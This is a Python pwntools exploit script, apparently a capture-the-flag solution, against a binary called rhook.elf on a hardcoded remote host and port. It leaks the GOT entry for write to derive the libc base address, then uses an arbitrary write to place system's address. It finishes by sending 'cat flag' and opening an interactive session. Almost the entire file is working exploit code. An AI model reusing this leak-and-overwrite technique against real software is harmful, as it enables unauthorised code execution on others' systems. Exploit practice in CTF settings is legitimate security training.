#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./demo2 --host 127.0.0.1 --port 1234
from pwn import *
from struct import unpack
import random, time
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rhook.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11654)
    
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO   
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)   
# RWX:      Has RWX segments 
io = start()
io.recvuntil(b'Well, you can read any 8 bytes...Enter address:\n')
write = exe.got['write']
io.sendline(str(write))
addr = u64(io.recv(8))
libc_base = addr-0x1111d0
libc_sys = libc_base+0x055410
save_name = 0x601090
io.recvuntil(b'Ok, you can write any 8 bytes...Enter address:')
io.sendline(str(save_name))
io.recvuntil(b'Now enter your bytes:')
io.send(p64(libc_sys))
io.recvuntil(b'enter your name:')
io.sendline(b'cat flag\x00')
io.interactive()
